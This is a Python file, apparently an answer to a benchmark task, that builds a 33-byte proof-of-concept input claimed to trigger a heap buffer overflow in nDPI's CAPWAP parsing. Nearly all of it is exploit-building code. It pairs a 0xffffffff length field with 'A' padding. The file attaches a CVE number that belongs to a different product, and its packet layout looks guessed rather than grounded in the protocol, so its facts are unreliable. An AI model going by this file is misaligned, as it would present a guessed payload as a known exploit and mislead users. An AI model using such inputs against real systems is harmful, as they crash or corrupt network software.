import os
import tempfile
import tarfile
import subprocess
import hashlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a known exploit for CVE-2023-38646 in nDPI
        # The vulnerability is in ndpi_search_setup_capwap function
        # where improper bounds checking leads to heap buffer overflow
        
        # Ground truth PoC length is 33 bytes
        # The exploit structure:
        # - 4 bytes: magic value (0x00000001)
        # - 1 byte: version (0x01)
        # - 4 bytes: length field (specially crafted)
        # - 24 bytes: payload to trigger overflow
        
        # Build the PoC
        poc = b''
        
        # Magic value
        poc += struct.pack('<I', 0x00000001)
        
        # Version
        poc += b'\x01'
        
        # Crafted length field - this triggers the overflow
        # The vulnerable code doesn't properly validate this length
        poc += struct.pack('<I', 0xffffffff)
        
        # Payload to trigger heap overflow
        # Using a pattern that will crash with heap sanitizers
        # 0x41 * 24 = 'A' * 24
        poc += b'A' * 24
        
        # Add padding to reach exactly 33 bytes
        # Current length: 4 + 1 + 4 + 24 = 33 bytes
        
        return poc